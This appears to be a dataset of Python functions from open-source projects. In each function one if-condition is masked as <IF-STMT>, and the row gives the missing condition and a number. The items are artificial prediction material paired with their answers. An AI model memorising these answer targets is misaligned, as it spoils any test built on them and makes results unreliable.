289,"def get_chart_data(self):<tab>rows = []<tab>for row in self.data:<tab><tab>row = frappe._dict(row)<tab><tab><IF-STMT><tab><tab><tab>values = [row.range1, row.range2, row.range3, row.range4, row.range5]<tab><tab><tab>precision = cint(frappe.db.get_default(""float_precision"")) or 2<tab><tab><tab>rows.append({""values"": [flt(val, precision) for val in values]})<tab>self.chart = {<tab><tab>""data"": {""labels"": self.ageing_column_labels, ""datasets"": rows},<tab><tab>""type"": ""percentage"",<tab>}",if not cint ( row . bold ) :,171
290,"def suite(aggressive):<tab>""""""Run against pep8 test suite.""""""<tab>result = True<tab>path = os.path.join(os.path.dirname(__file__), ""suite"")<tab>for filename in os.listdir(path):<tab><tab>filename = os.path.join(path, filename)<tab><tab><IF-STMT><tab><tab><tab>print(filename, file=sys.stderr)<tab><tab><tab>result = run(filename, aggressive=aggressive) and result<tab>if result:<tab><tab>print(GREEN + ""Okay"" + END)<tab>return result","if filename . endswith ( "".py"" ) :",133
291,"def list_generator(pages, num_results):<tab>result = []<tab># get first page items<tab>page = list(next(pages))<tab>result += page<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab># handle num results<tab><tab>if num_results is not None:<tab><tab><tab>if num_results == len(result):<tab><tab><tab><tab>break<tab><tab>page = list(next(pages))<tab><tab>result += page<tab>return result",if not pages . continuation_token :,118
292,"def _detect_too_many_digits(f):<tab>ret = []<tab>for node in f.nodes:<tab><tab># each node contains a list of IR instruction<tab><tab>for ir in node.irs:<tab><tab><tab># iterate over all the variables read by the IR<tab><tab><tab>for read in ir.read:<tab><tab><tab><tab># if the variable is a constant<tab><tab><tab><tab>if isinstance(read, Constant):<tab><tab><tab><tab><tab># read.value can return an int or a str. Convert it to str<tab><tab><tab><tab><tab>value_as_str = read.original_value<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab># Info to be printed<tab><tab><tab><tab><tab><tab>ret.append(node)<tab>return ret","if ""00000"" in value_as_str :",183
293,"def write_varint(trans, n):<tab>out = []<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>out.append(n)<tab><tab><tab>break<tab><tab>else:<tab><tab><tab>out.append((n & 0xFF) | 0x80)<tab><tab><tab>n = n >> 7<tab>data = array.array(""B"", out).tostring()<tab>if PY3:<tab><tab>trans.write(data)<tab>else:<tab><tab>trans.write(bytes(data))",if n & ~ 0x7F == 0 :,126
294,"def __call__(self, environ, start_response):<tab>query_string = environ.get(""QUERY_STRING"")<tab>if ""sql_debug=1"" in query_string:<tab><tab>import galaxy.app<tab><tab><IF-STMT><tab><tab><tab>galaxy.app.app.model.thread_local_log.log = True<tab>try:<tab><tab>reset_request_query_counts()<tab><tab>return self.application(environ, start_response)<tab>finally:<tab><tab>log_request_query_counts(environ.get(""PATH_INFO""))",if galaxy . app . app . model . thread_local_log :,146
295,"def SvGetSocketInfo(socket):<tab>""""""returns string to show in socket label""""""<tab>global socket_data_cache<tab>ng = socket.id_data.tree_id<tab>if socket.is_output:<tab><tab>s_id = socket.socket_id<tab>elif socket.is_linked:<tab><tab>other = socket.other<tab><tab>if other and hasattr(other, ""socket_id""):<tab><tab><tab>s_id = other.socket_id<tab><tab>else:<tab><tab><tab>return """"<tab>else:<tab><tab>return """"<tab>if ng in socket_data_cache:<tab><tab>if s_id in socket_data_cache[ng]:<tab><tab><tab>data = socket_data_cache[ng][s_id]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return str(len(data))<tab>return """"",if data :,197
296,"def print_nested_help(self, args: argparse.Namespace) -> None:<tab>level = 0<tab>parser = self.main_parser<tab>while True:<tab><tab>if parser._subparsers is None:<tab><tab><tab>break<tab><tab>if parser._subparsers._actions is None:<tab><tab><tab>break<tab><tab>choices = parser._subparsers._actions[-1].choices<tab><tab>value = getattr(args, ""level_%d"" % level)<tab><tab>if value is None:<tab><tab><tab>parser.print_help()<tab><tab><tab>return<tab><tab>if not choices:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>parser = choices[value]<tab><tab>else:<tab><tab><tab>return<tab><tab>level += 1","if isinstance ( choices , dict ) :",175
297,"def tag_configure(self, *args, **keys):<tab>trace = False and not g.unitTesting<tab>if trace:<tab><tab>g.trace(args, keys)<tab>if len(args) == 1:<tab><tab>key = args[0]<tab><tab>self.tags[key] = keys<tab><tab>val = keys.get(""foreground"")<tab><tab>underline = keys.get(""underline"")<tab><tab>if val:<tab><tab><tab>self.configDict[key] = val<tab><tab><IF-STMT><tab><tab><tab>self.configUnderlineDict[key] = True<tab>else:<tab><tab>g.trace(""oops"", args, keys)",if underline :,150
298,"def get_tokens_unprocessed(self, text):<tab>for index, token, value in RegexLexer.get_tokens_unprocessed(self, text):<tab><tab>if token is Name:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab>elif self.c99highlighting and value in self.c99_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab>elif self.platformhighlighting and value in self.linux_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab>yield index, token, value",if self . stdlibhighlighting and value in self . stdlib_types :,141
299,"def materialize_as_ndarray(a):<tab>""""""Convert distributed arrays to ndarrays.""""""<tab>if type(a) in (list, tuple):<tab><tab><IF-STMT><tab><tab><tab>return da.compute(*a, sync=True)<tab><tab>return tuple(np.asarray(arr) for arr in a)<tab>return np.asarray(a)","if da is not None and any ( isinstance ( arr , da . Array ) for arr in a ) :",98
300,"def decorated_function(*args, **kwargs):<tab>rv = f(*args, **kwargs)<tab>if isinstance(rv, flask.Response):<tab><tab>try:<tab><tab><tab>result = etag<tab><tab><tab>if callable(result):<tab><tab><tab><tab>result = result(rv)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rv.set_etag(result)<tab><tab>except Exception:<tab><tab><tab>logging.getLogger(__name__).exception(<tab><tab><tab><tab>""Error while calculating the etag value for response {!r}"".format(rv)<tab><tab><tab>)<tab>return rv",if result :,133
301,"def applyBC(self):<tab>""""""apply boundary conditions""""""<tab>deltaR = 2.0<tab>for coord in self.pos:<tab><tab><IF-STMT><tab><tab><tab>coord[0] = -deltaR<tab><tab>if coord[0] < -deltaR:<tab><tab><tab>coord[0] = width + deltaR<tab><tab>if coord[1] > height + deltaR:<tab><tab><tab>coord[1] = -deltaR<tab><tab>if coord[1] < -deltaR:<tab><tab><tab>coord[1] = height + deltaR",if coord [ 0 ] > width + deltaR :,135
302,"def removeInsideIslands(self):<tab>self.CleanPath = []<tab>cleanpath = Path(""Path"")<tab>for path in self.NewPaths:<tab><tab>for seg in path:<tab><tab><tab>inside = False<tab><tab><tab>for island in self.IntersectedIslands:<tab><tab><tab><tab>issegin = island.isSegInside(seg) == 1<tab><tab><tab><tab>if issegin:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>inside = True<tab><tab><tab><tab><tab><tab>break<tab><tab><tab>if not inside:<tab><tab><tab><tab>cleanpath.append(seg)<tab>cleanpath = cleanpath.split2contours()<tab>self.CleanPath.extend(cleanpath)",if not seg in island :,176
303,"def _parse_lines(self, linesource):<tab>""""""Parse lines of text for functions and classes""""""<tab>functions = []<tab>classes = []<tab>for line in linesource:<tab><tab>if line.startswith(""def "") and line.count(""(""):<tab><tab><tab># exclude private stuff<tab><tab><tab>name = self._get_object_name(line)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>functions.append(name)<tab><tab>elif line.startswith(""class ""):<tab><tab><tab># exclude private stuff<tab><tab><tab>name = self._get_object_name(line)<tab><tab><tab>if not name.startswith(""_""):<tab><tab><tab><tab>classes.append(name)<tab><tab>else:<tab><tab><tab>pass<tab>functions.sort()<tab>classes.sort()<tab>return functions, classes","if not name . startswith ( ""_"" ) :",185
304,"def process(self, buckets, event=None):<tab>results = []<tab>with self.executor_factory(max_workers=2) as w:<tab><tab>futures = {w.submit(self.process_bucket, bucket): bucket for bucket in buckets}<tab><tab>for f in as_completed(futures):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>results.append(futures[f])<tab>return results",if f . result ( ) :,97
305,"def build_polymorphic_ctypes_map(cls):<tab># {'1': 'unified_job', '2': 'Job', '3': 'project_update', ...}<tab>mapping = {}<tab>for ct in ContentType.objects.filter(app_label=""main""):<tab><tab>ct_model_class = ct.model_class()<tab><tab><IF-STMT><tab><tab><tab>mapping[ct.id] = camelcase_to_underscore(ct_model_class.__name__)<tab>return mapping","if ct_model_class and issubclass ( ct_model_class , cls ) :",126
306,"def expand_decodings(self, node: Node) -> None:<tab>val = node.level.result.value<tab>for decoder in self.get_decoders_for(type(val)):<tab><tab>inst = self._config()(decoder)<tab><tab>res = inst(val)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>try:<tab><tab><tab>new_node = Node.decoding(<tab><tab><tab><tab>config=self._config(), route=inst, result=res, source=node<tab><tab><tab>)<tab><tab>except DuplicateNode:<tab><tab><tab>continue<tab><tab>logger.trace(""Nesting encodings"")<tab><tab>self.recursive_expand(new_node, False)",if res is None :,159
307,"def test_file(self):<tab>a = 3.33 + 4.43j<tab>b = 5.1 + 2.3j<tab>fo = None<tab>try:<tab><tab>fo = open(test_support.TESTFN, ""wb"")<tab><tab>print >> fo, a, b<tab><tab>fo.close()<tab><tab>fo = open(test_support.TESTFN, ""rb"")<tab><tab>self.assertEqual(fo.read(), ""%s %s\n"" % (a, b))<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>fo.close()<tab><tab>test_support.unlink(test_support.TESTFN)",if ( fo is not None ) and ( not fo . closed ) :,158
308,"def repl(m):<tab>if m.group(2) is not None:<tab><tab>high = int(m.group(1), 16)<tab><tab>low = int(m.group(2), 16)<tab><tab><IF-STMT><tab><tab><tab>cp = ((high - 0xD800) << 10) + (low - 0xDC00) + 0x10000<tab><tab><tab>return unichr(cp)<tab><tab>else:<tab><tab><tab>return unichr(high) + unichr(low)<tab>else:<tab><tab>return unichr(int(m.group(1), 16))",if 0xD800 <= high <= 0xDBFF and 0xDC00 <= low <= 0xDFFF :,149
309,"def generate_credits(user, start_date, end_date, **kwargs):<tab>""""""Generate credits data for given component.""""""<tab>result = []<tab>base = Change.objects.content()<tab>if user:<tab><tab>base = base.filter(author=user)<tab>for language in Language.objects.filter(**kwargs).distinct().iterator():<tab><tab>authors = base.filter(language=language, **kwargs).authors_list(<tab><tab><tab>(start_date, end_date)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>result.append({language.name: sorted(authors, key=lambda item: item[2])})<tab>return result",if not authors :,157
310,"def history_prev(self):<tab>""""""Go back in the history.""""""<tab>try:<tab><tab><IF-STMT><tab><tab><tab>item = self._history.start(self.text().strip())<tab><tab>else:<tab><tab><tab>item = self._history.previtem()<tab>except (cmdhistory.HistoryEmptyError, cmdhistory.HistoryEndReachedError):<tab><tab>return<tab>self.setText(item)",if not self . _history . is_browsing ( ) :,102
311,"def destroy(self):<tab>self._bind()<tab>for name in ""jobItems"", ""jobFileIDs"", ""files"", ""statsFiles"", ""statsFileIDs"":<tab><tab>resource = getattr(self, name)<tab><tab>if resource is not None:<tab><tab><tab>if isinstance(resource, AzureTable):<tab><tab><tab><tab>resource.delete_table()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>resource.delete_container()<tab><tab><tab>else:<tab><tab><tab><tab>assert False<tab><tab><tab>setattr(self, name, None)","elif isinstance ( resource , AzureBlobContainer ) :",135
312,"def user_defined_os():<tab>if menu.options.os:<tab><tab><IF-STMT><tab><tab><tab>settings.TARGET_OS = ""win""<tab><tab><tab>return True<tab><tab>elif menu.options.os.lower() == ""unix"":<tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>err_msg = ""You specified wrong value '"" + menu.options.os + ""' ""<tab><tab><tab>err_msg += ""as an operation system. The value, must be 'Windows' or 'Unix'.""<tab><tab><tab>print(settings.print_critical_msg(err_msg))<tab><tab><tab>raise SystemExit()","if menu . options . os . lower ( ) == ""windows"" :",153
313,"def test_save(art_warning, image_dl_estimator):<tab>try:<tab><tab>classifier, _ = image_dl_estimator(from_logits=True)<tab><tab>t_file = tempfile.NamedTemporaryFile()<tab><tab>model_path = t_file.name<tab><tab>t_file.close()<tab><tab>filename = ""model_to_save""<tab><tab>classifier.save(filename, path=model_path)<tab><tab>assert path.exists(model_path)<tab><tab>created_model = False<tab><tab>for file in listdir(model_path):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>created_model = True<tab><tab>assert created_model<tab>except ARTTestException as e:<tab><tab>art_warning(e)",if filename in file :,172
314,"def set_extra_data(self, extra_data=None):<tab>if extra_data and self.extra_data != extra_data:<tab><tab><IF-STMT><tab><tab><tab>self.extra_data.update(extra_data)<tab><tab>else:<tab><tab><tab>self.extra_data = extra_data<tab><tab>return True","if self . extra_data and not isinstance ( self . extra_data , str ) :",93
315,"def get_image_dimensions(path):<tab>""""""Returns the (width, height) of an image at a given path.""""""<tab>p = ImageFile.Parser()<tab>fp = open(path, ""rb"")<tab>while 1:<tab><tab>data = fp.read(1024)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>p.feed(data)<tab><tab>if p.image:<tab><tab><tab>return p.image.size<tab><tab><tab>break<tab>fp.close()<tab>return None",if not data :,118
316,"def language_suffixes():<tab>for lang in NSLocale.preferredLanguages():<tab><tab>while True:<tab><tab><tab>yield ""_"" + lang if lang != ""en"" else """"<tab><tab><tab><IF-STMT><tab><tab><tab><tab>lang = lang[: lang.rfind(""-"")]<tab><tab><tab>else:<tab><tab><tab><tab>break<tab>yield """"","if ""-"" in lang :",78
317,"def decode_binary(binarystring):<tab>""""""Decodes a binary string into it's integer value.""""""<tab>n = 0<tab>for c in binarystring:<tab><tab>if c == ""0"":<tab><tab><tab>d = 0<tab><tab><IF-STMT><tab><tab><tab>d = 1<tab><tab>else:<tab><tab><tab>raise ValueError(""Not an binary number"", binarystring)<tab><tab># Could use ((n << 3 ) | d), but python 2.3 issues a FutureWarning.<tab><tab>n = (n * 2) + d<tab>return n","elif c == ""1"" :",126
318,"def serialize_groups_for_summary(node):<tab>groups = node.osf_groups<tab>n_groups = len(groups)<tab>group_string = """"<tab>for index, group in enumerate(groups):<tab><tab>if index == n_groups - 1:<tab><tab><tab>separator = """"<tab><tab><IF-STMT><tab><tab><tab>separator = "" & ""<tab><tab>else:<tab><tab><tab>separator = "", ""<tab><tab>group_string = group_string + group.name + separator<tab>return group_string",elif index == n_groups - 2 :,125
319,"def _save(self, req_method, requires):<tab>conanfile = GenConanfile()<tab>for req in requires:<tab><tab>req2, override = req if isinstance(req, tuple) else (req, False)<tab><tab><IF-STMT><tab><tab><tab>conanfile.with_require(req2, override=override)<tab><tab>else:<tab><tab><tab>conanfile.with_requirement(req2, override=override)<tab>self.client.save({""conanfile.py"": conanfile}, clean_first=True)",if not req_method :,130
320,"def _validate_declarations(<tab>declarations: Sequence[Union[qlast.ModuleDeclaration, qlast.DDLCommand]]) -> None:<tab># Check that top-level declarations either use fully-qualified<tab># names or are module blocks.<tab>for decl in declarations:<tab><tab><IF-STMT><tab><tab><tab>raise EdgeQLSyntaxError(<tab><tab><tab><tab>""only fully-qualified name is allowed in "" ""top-level declaration"",<tab><tab><tab><tab>context=decl.name.context,<tab><tab><tab>)","if not isinstance ( decl , qlast . ModuleDeclaration ) and decl . name . module is None :",134
321,"def assess_trial(self, trial_job_id, trial_history):<tab>_logger.info(""assess trial %s %s"", trial_job_id, trial_history)<tab>id_ = trial_history[0]<tab>if id_ in self._killed:<tab><tab>return AssessResult.Bad<tab>s = 0<tab>for i, val in enumerate(trial_history):<tab><tab>s += val<tab><tab><IF-STMT><tab><tab><tab>self._killed.add(id_)<tab><tab><tab>_result.write(""%d %d\n"" % (id_, i + 1))<tab><tab><tab>_result.flush()<tab><tab><tab>return AssessResult.Bad<tab>return AssessResult.Good",if s % 11 == 1 :,170
322,"def decProcess():<tab>while 1:<tab><tab>yield clock.posedge, reset.negedge<tab><tab><IF-STMT><tab><tab><tab>count.next = 0<tab><tab>else:<tab><tab><tab>if enable:<tab><tab><tab><tab>if count == -n:<tab><tab><tab><tab><tab>count.next = n - 1<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>count.next = count - 1",if reset == ACTIVE_LOW :,100
323,"def activate_profile(test=True):<tab>pr = None<tab>if test:<tab><tab><IF-STMT><tab><tab><tab>pr = cProfile.Profile()<tab><tab><tab>pr.enable()<tab><tab>else:<tab><tab><tab>log.error(""cProfile is not available on your platform"")<tab>return pr",if HAS_CPROFILE :,74
324,"def insertTestData(self, rows):<tab>for row in rows:<tab><tab>if isinstance(row, Log):<tab><tab><tab>self.logs[row.id] = row.values.copy()<tab>for row in rows:<tab><tab><IF-STMT><tab><tab><tab>lines = self.log_lines.setdefault(row.logid, [])<tab><tab><tab># make sure there are enough slots in the list<tab><tab><tab>if len(lines) < row.last_line + 1:<tab><tab><tab><tab>lines.append([None] * (row.last_line + 1 - len(lines)))<tab><tab><tab>row_lines = row.content.decode(""utf-8"").split(""\n"")<tab><tab><tab>lines[row.first_line : row.last_line + 1] = row_lines","if isinstance ( row , LogChunk ) :",187
325,"def getText(self, stuff):<tab>if isinstance(stuff, BaseWrapper):<tab><tab>stuff = stuff.item<tab>if isinstance(stuff, (Fit, TargetProfile)):<tab><tab>val, unit = self._getValue(stuff)<tab><tab>if val is None:<tab><tab><tab>return """"<tab><tab># Stick to value - 25k GJ<tab><tab><IF-STMT><tab><tab><tab>return ""{} {}"".format(formatAmount(val, *self.formatSpec), unit)<tab><tab># Stick to unit - 25 km<tab><tab>else:<tab><tab><tab>return formatAmount(val, *self.formatSpec, unitName=unit)<tab>return """"",if self . stickPrefixToValue :,155
326,"def wrap(request, *args, **kwargs):<tab>""Wrap""<tab>user = request.user.profile<tab>if ""massform"" in request.POST:<tab><tab>for key in request.POST:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>changeset = ChangeSet.objects.get(pk=request.POST[key])<tab><tab><tab><tab><tab>form = MassActionForm(<tab><tab><tab><tab><tab><tab>request.user.profile, request.POST, instance=changeset<tab><tab><tab><tab><tab>)<tab><tab><tab><tab><tab>if form.is_valid() and user.has_permission(changeset, mode=""w""):<tab><tab><tab><tab><tab><tab>form.save()<tab><tab><tab><tab>except Exception:<tab><tab><tab><tab><tab>pass<tab>return f(request, *args, **kwargs)","if ""mass-changeset"" in key :",196
327,"def select(self, browser, locator):<tab>assert browser is not None<tab>if locator is not None:<tab><tab>if isinstance(locator, list):<tab><tab><tab>self._select_by_excludes(browser, locator)<tab><tab><tab>return<tab><tab>if locator.lower() == ""self"" or locator.lower() == ""current"":<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>self._select_by_last_index(browser)<tab><tab><tab>return<tab>(prefix, criteria) = self._parse_locator(locator)<tab>strategy = self._strategies.get(prefix)<tab>if strategy is None:<tab><tab>raise ValueError(""Window locator with prefix '"" + prefix + ""' is not supported"")<tab>return strategy(browser, criteria)","if locator . lower ( ) == ""new"" or locator . lower ( ) == ""popup"" :",187
328,"def test_all(self):<tab>for context in get_contexts():<tab><tab>found = False<tab><tab>expected_context_name = context.get_name()<tab><tab>for calculated_context in get_context(self.HTML, expected_context_name):<tab><tab><tab>if calculated_context.get_name() == expected_context_name:<tab><tab><tab><tab>found = True<tab><tab><IF-STMT><tab><tab><tab>msg = ""The analysis for %s context failed, got %r instead.""<tab><tab><tab>msg = msg % (<tab><tab><tab><tab>expected_context_name,<tab><tab><tab><tab>get_context(self.HTML, expected_context_name),<tab><tab><tab>)<tab><tab><tab>self.assertTrue(False, msg)",if not found :,171
329,"def visit_title(self, node: Element) -> None:<tab>if isinstance(node.parent, addnodes.seealso):<tab><tab>self.body.append('.IP ""')<tab><tab>return<tab>elif isinstance(node.parent, nodes.section):<tab><tab><IF-STMT><tab><tab><tab># skip the document title<tab><tab><tab>raise nodes.SkipNode<tab><tab>elif self.section_level == 1:<tab><tab><tab>self.body.append("".SH %s\n"" % self.deunicode(node.astext().upper()))<tab><tab><tab>raise nodes.SkipNode<tab>return super().visit_title(node)",if self . section_level == 0 :,145
330,"def parse_svn_stats(status):<tab>stats = RepoStats()<tab>for line in status:<tab><tab><IF-STMT><tab><tab><tab>stats.new += 1<tab><tab>elif line[0] == ""C"":<tab><tab><tab>stats.conflicted += 1<tab><tab>elif line[0] in [""A"", ""D"", ""I"", ""M"", ""R"", ""!"", ""~""]:<tab><tab><tab>stats.changed += 1<tab>return stats","if line [ 0 ] == ""?"" :",106
331,"def setoutput(self, spec, defs=None):<tab>self.closespec()<tab>self.closedefs()<tab>if spec:<tab><tab>if type(spec) == StringType:<tab><tab><tab>file = self.openoutput(spec)<tab><tab><tab>mine = 1<tab><tab>else:<tab><tab><tab>file = spec<tab><tab><tab>mine = 0<tab><tab>self.specfile = file<tab><tab>self.specmine = mine<tab>if defs:<tab><tab><IF-STMT><tab><tab><tab>file = self.openoutput(defs)<tab><tab><tab>mine = 1<tab><tab>else:<tab><tab><tab>file = defs<tab><tab><tab>mine = 0<tab><tab>self.defsfile = file<tab><tab>self.defsmine = mine",if type ( defs ) == StringType :,179
332,"def __new__(cls, name, bases, d):<tab>rv = type.__new__(cls, name, bases, d)<tab>if ""methods"" not in d:<tab><tab>methods = set(rv.methods or [])<tab><tab>for key, value in d.iteritems():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>methods.add(key.upper())<tab><tab># if we have no method at all in there we don't want to<tab><tab># add a method list.  (This is for instance the case for<tab><tab># the baseclass or another subclass of a base method view<tab><tab># that does not introduce new methods).<tab><tab>if methods:<tab><tab><tab>rv.methods = sorted(methods)<tab>return rv",if key in http_method_funcs :,172
333,"def draw_lines(col, lines):<tab>skip = False<tab>for l in lines:<tab><tab>if l:<tab><tab><tab>col.label(text=l)<tab><tab><tab>skip = False<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>col.label(text=l)<tab><tab><tab>skip = True",elif skip :,82
334,"def adjust_sockets(self):<tab>variables = self.get_variables()<tab>for key in self.inputs.keys():<tab><tab>if key not in variables and key not in [""Field""]:<tab><tab><tab>self.debug(<tab><tab><tab><tab>""Input {} not in variables {}, remove it"".format(key, str(variables))<tab><tab><tab>)<tab><tab><tab>self.inputs.remove(self.inputs[key])<tab>for v in variables:<tab><tab><IF-STMT><tab><tab><tab>self.debug(<tab><tab><tab><tab>""Variable {} not in inputs {}, add it"".format(<tab><tab><tab><tab><tab>v, str(self.inputs.keys())<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>self.inputs.new(""SvStringsSocket"", v)",if v not in self . inputs :,183
335,"def forward(self, g, x):<tab>h = x<tab>for l, conv in enumerate(self.layers):<tab><tab>h = conv(g, h)<tab><tab><IF-STMT><tab><tab><tab>h = self.activation(h)<tab><tab><tab>h = self.dropout(h)<tab>return h",if l != len ( self . layers ) - 1 :,82
336,"def process_doc(self, docstrings: List[List[str]]) -> Iterator[str]:<tab>""""""Let the user process the docstrings before adding them.""""""<tab>for docstringlines in docstrings:<tab><tab><IF-STMT><tab><tab><tab># let extensions preprocess docstrings<tab><tab><tab>self.env.app.emit(<tab><tab><tab><tab>""autodoc-process-docstring"",<tab><tab><tab><tab>self.objtype,<tab><tab><tab><tab>self.fullname,<tab><tab><tab><tab>self.object,<tab><tab><tab><tab>self.options,<tab><tab><tab><tab>docstringlines,<tab><tab><tab>)<tab><tab><tab>if docstringlines and docstringlines[-1] != """":<tab><tab><tab><tab># append a blank line to the end of the docstring<tab><tab><tab><tab>docstringlines.append("""")<tab><tab>yield from docstringlines",if self . env . app :,185
337,"def wiki(self, query):<tab>res = []<tab>for entry in g.current_wiki.get_index():<tab><tab>name = filename_to_cname(entry[""name""])<tab><tab>name = re.sub(r""//+"", ""/"", name)<tab><tab>if set(query.split()).intersection(name.replace(""/"", ""-"").split(""-"")):<tab><tab><tab>page = g.current_wiki.get_page(name)<tab><tab><tab># this can be None, not sure how<tab><tab><tab><IF-STMT><tab><tab><tab><tab>res.append(dict(name=name, content=page.data))<tab>return res",if page :,143
338,"def checkForFinishedThreads(self):<tab>""Mark terminated threads with endTime.""<tab>for t in self.unfinishedThreads:<tab><tab>if not t.is_alive():<tab><tab><tab>t.endTime = time.process_time()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>t.status = ""ended""","if getattr ( t , ""status"" , None ) is None :",84
339,"def testTicketFlags(self):<tab>flags = (""restored"", ""banned"")<tab>ticket = Ticket(""test"", 0)<tab>trueflags = []<tab>for v in (True, False, True):<tab><tab>for f in flags:<tab><tab><tab>setattr(ticket, f, v)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>trueflags.append(f)<tab><tab><tab>else:<tab><tab><tab><tab>trueflags.remove(f)<tab><tab><tab>for f2 in flags:<tab><tab><tab><tab>self.assertEqual(bool(getattr(ticket, f2)), f2 in trueflags)<tab>## inherite props from another tockets:<tab>ticket = FailTicket(ticket=ticket)<tab>for f2 in flags:<tab><tab>self.assertTrue(bool(getattr(ticket, f2)))",if v :,189
340,"def decode(obj, encoding=""utf-8"", errors=""strict""):<tab>decoder = __decoder(encoding)<tab>if decoder:<tab><tab>result = decoder(obj, errors)<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(""decoder must return a tuple (object, integer)"")<tab><tab>return result[0]","if not ( isinstance ( result , tuple ) and len ( result ) == 2 ) :",86
341,"def work(self):<tab>""""""Play the animation.""""""<tab># if loop_mode is once and we are already on the last frame,<tab># return to the first frame... (so the user can keep hitting once)<tab>if self.loop_mode == LoopMode.ONCE:<tab><tab><IF-STMT><tab><tab><tab>self.frame_requested.emit(self.axis, self.min_point)<tab><tab>elif self.step < 0 and self.current <= self.min_point + 1:<tab><tab><tab>self.frame_requested.emit(self.axis, self.max_point)<tab><tab>self.timer.singleShot(int(self.interval), self.advance)<tab>else:<tab><tab># immediately advance one frame<tab><tab>self.advance()<tab>self.started.emit()",if self . step > 0 and self . current >= self . max_point - 1 :,199
342,"def get_order(self, aStr):<tab># for big5 encoding, we are interested<tab>#   first  byte range: 0xa4 -- 0xfe<tab>#   second byte range: 0x40 -- 0x7e , 0xa1 -- 0xfe<tab># no validation needed here. State machine has done that<tab>if aStr[0] >= ""\xA4"":<tab><tab><IF-STMT><tab><tab><tab>return 157 * (ord(aStr[0]) - 0xA4) + ord(aStr[1]) - 0xA1 + 63<tab><tab>else:<tab><tab><tab>return 157 * (ord(aStr[0]) - 0xA4) + ord(aStr[1]) - 0x40<tab>else:<tab><tab>return -1","if aStr [ 1 ] >= ""\xA1"" :",185
343,"def validate_literals(self):<tab>try:<tab><tab>for c in self.literals:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.log.error(<tab><tab><tab><tab><tab>""Invalid literal %s. Must be a single character"", repr(c)<tab><tab><tab><tab>)<tab><tab><tab><tab>self.error = True<tab>except TypeError:<tab><tab>self.log.error(<tab><tab><tab>""Invalid literals specification. literals must be a sequence of characters""<tab><tab>)<tab><tab>self.error = True","if not isinstance ( c , StringTypes ) or len ( c ) > 1 :",135
344,"def filter(self, qs, value):<tab>if value:<tab><tab>if value.start is not None and value.stop is not None:<tab><tab><tab>value = (value.start, value.stop)<tab><tab>elif value.start is not None:<tab><tab><tab>self.lookup_expr = ""startswith""<tab><tab><tab>value = value.start<tab><tab><IF-STMT><tab><tab><tab>self.lookup_expr = ""endswith""<tab><tab><tab>value = value.stop<tab>return super().filter(qs, value)",elif value . stop is not None :,125
345,"def parse_stdout(s):<tab>argv = re.search(""^===ARGV=(.*?)$"", s, re.M).group(1)<tab>argv = argv.split()<tab>testname = argv[-1]<tab>del argv[-1]<tab>hub = None<tab>reactor = None<tab>while argv:<tab><tab><IF-STMT><tab><tab><tab>hub = argv[1]<tab><tab><tab>del argv[0]<tab><tab><tab>del argv[0]<tab><tab>elif argv[0] == ""--reactor"":<tab><tab><tab>reactor = argv[1]<tab><tab><tab>del argv[0]<tab><tab><tab>del argv[0]<tab><tab>else:<tab><tab><tab>del argv[0]<tab>if reactor is not None:<tab><tab>hub += ""/%s"" % reactor<tab>return testname, hub","if argv [ 0 ] == ""--hub"" :",196
346,"def get(self, key):<tab>try:<tab><tab>res = self.server.get(<tab><tab><tab>index=self.index,<tab><tab><tab>doc_type=self.doc_type,<tab><tab><tab>id=key,<tab><tab>)<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return res[""_source""][""result""]<tab><tab>except (TypeError, KeyError):<tab><tab><tab>pass<tab>except elasticsearch.exceptions.NotFoundError:<tab><tab>pass","if res [ ""found"" ] :",112
347,"def _get_target_chap_auth(self, context, volume):<tab>""""""Get the current chap auth username and password.""""""<tab>try:<tab><tab># Query DB to get latest state of volume<tab><tab>volume_info = self.db.volume_get(context, volume[""id""])<tab><tab># 'provider_auth': 'CHAP user_id password'<tab><tab><IF-STMT><tab><tab><tab>return tuple(volume_info[""provider_auth""].split("" "", 3)[1:])<tab>except exception.NotFound:<tab><tab>LOG.debug(""Failed to get CHAP auth from DB for %s."", volume[""id""])","if volume_info [ ""provider_auth"" ] :",149
348,"def merge(self, hosts):<tab>for ei in self:<tab><tab>host_name = ei.get_name()<tab><tab>h = hosts.find_by_name(host_name)<tab><tab><IF-STMT><tab><tab><tab># FUUUUUUUUUUsion<tab><tab><tab>self.merge_extinfo(h, ei)",if h is not None :,86
